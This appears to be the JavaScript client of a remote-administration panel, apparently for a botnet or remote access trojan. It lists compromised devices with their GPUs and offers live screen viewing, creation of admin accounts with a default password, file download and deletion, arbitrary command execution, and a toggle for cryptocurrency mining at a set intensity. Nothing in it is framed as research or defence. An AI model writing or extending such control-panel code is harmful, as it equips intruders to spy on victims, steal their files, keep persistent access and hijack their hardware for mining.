let selectedDevice = null;
let currentPath = "C:\\";
let ws = null;

async function loadDevices() {
    try {
        const response = await fetch('/api/devices');
        const data = await response.json();
        renderDevices(data.devices);
    } catch (error) {
        console.error('Failed to load devices:', error);
    }
}

function renderDevices(devices) {
    const container = document.getElementById('devices-list');
    container.innerHTML = devices.map(device => `
        <div class="device-card ${device.status}" onclick="selectDevice('${device.id}', '${device.hostname}')">
            <div class="device-name">${device.hostname}</div>
            <div class="device-info">
                <span>IP: ${device.ip}</span>
                <span>OS: ${device.os}</span>
                <span>GPU: ${device.gpu_name || 'None'}</span>
                <span>Last seen: ${new Date(device.last_seen).toLocaleString()}</span>
            </div>
            <span class="status-badge ${device.status}">${device.status.toUpperCase()}</span>
        </div>
    `).join('');
}

function selectDevice(deviceId, hostname) {
    selectedDevice = { id: deviceId, hostname: hostname };
    document.getElementById('selected-device').textContent = hostname;
    document.getElementById('control-panel').style.display = 'block';
}

async function viewScreen() {
    if (!selectedDevice) return;

    document.getElementById('screen-view').style.display = 'block';
    document.getElementById('screen-device').textContent = selectedDevice.hostname;

    ws = new WebSocket(`ws://${location.host}/ws/screen/${selectedDevice.id}`);
    ws.onmessage = function(event) {
        document.getElementById('screen-image').src = `data:image/jpeg;base64,${event.data}`;
    };
    ws.onerror = function() {
        document.getElementById('screen-image').alt = 'Failed to connect to device';
    };
}

function closeScreen() {
    document.getElementById('screen-view').style.display = 'none';
    if (ws) {
        ws.close();
        ws = null;
    }
}

async function createAdmin() {
    if (!selectedDevice) return;

    const username = prompt('Enter admin username:', 'System Admin');
    if (!username) return;

    const password = prompt('Enter admin password:', 'Admin@WatchfulEye1');
    if (!password) return;

    try {
        const response = await fetch(`/api/devices/${selectedDevice.id}/admin/create`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        alert(data.result?.success ? 'Admin created successfully!' : 'Failed to create admin');
    } catch (error) {
        alert('Error creating admin');
    }
}

async function browseFiles() {
    if (!selectedDevice) return;

    document.getElementById('files-view').style.display = 'block';
    document.getElementById('files-device').textContent = selectedDevice.hostname;
    currentPath = "C:\\";
    await loadFiles();
}

async function loadFiles() {
    try {
        const response = await fetch(`/api/devices/${selectedDevice.id}/files?path=${encodeURIComponent(currentPath)}`);
        const data = await response.json();
        renderFiles(data.files || []);
    } catch (error) {
        document.getElementById('files-list').innerHTML = '<p>Failed to load files</p>';
    }
}

function renderFiles(files) {
    document.getElementById('files-path').textContent = currentPath;

    const container = document.getElementById('files-list');
    container.innerHTML = files.map(file => `
        <div class="file-item ${file.is_dir ? 'folder' : 'file'}"
             onclick="${file.is_dir ? `navigateTo('${file.path.replace(/\\/g, '\\\\')}')` : `selectFile('${file.path.replace(/\\/g, '\\\\')}')`}">
            ${file.is_dir ? '📁' : '📄'} ${file.name}
        </div>
    `).join('');
}

function navigateTo(path) {
    currentPath = path;
    loadFiles();
}

function selectFile(path) {
    const action = confirm('Download this file?');
    if (action) {
        downloadFile(path);
    } else if (confirm('Delete this file?')) {
        deleteFile(path);
    }
}

async function downloadFile(path) {
    window.open(`/api/devices/${selectedDevice.id}/files/download?remote_path=${encodeURIComponent(path)}`);
}

async function deleteFile(path) {
    if (!confirm('Are you sure you want to delete this file?')) return;

    try {
        await fetch(`/api/devices/${selectedDevice.id}/files?remote_path=${encodeURIComponent(path)}`, {
            method: 'DELETE'
        });
        await loadFiles();
    } catch (error) {
        alert('Failed to delete file');
    }
}

function closeFiles() {
    document.getElementById('files-view').style.display = 'none';
}

function runCommand() {
    if (!selectedDevice) return;
    document.getElementById('command-view').style.display = 'block';
    document.getElementById('command-device').textContent = selectedDevice.hostname;
}

async function executeCommand() {
    const command = document.getElementById('command-input').value;
    if (!command) return;

    try {
        const response = await fetch(`/api/devices/${selectedDevice.id}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: selectedDevice.id, command })
        });
        const data = await response.json();
        document.getElementById('command-output').textContent = JSON.stringify(data.result, null, 2);
    } catch (error) {
        document.getElementById('command-output').textContent = 'Error executing command';
    }
}

function closeCommand() {
    document.getElementById('command-view').style.display = 'none';
}

async function toggleMining() {
    if (!selectedDevice) return;

    const enable = confirm('Enable mining on this device?');
    const intensity = parseInt(prompt('Mining intensity (1-100):', '50') || '50');

    try {
        const response = await fetch(`/api/devices/${selectedDevice.id}/mining`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_id: selectedDevice.id,
                enabled: enable,
                intensity: intensity
            })
        });
        const data = await response.json();
        alert(data.result?.success ? 'Mining configured!' : 'Failed to configure mining');
    } catch (error) {
        alert('Error configuring mining');
    }
}

setInterval(loadDevices, 30000);
loadDevices();
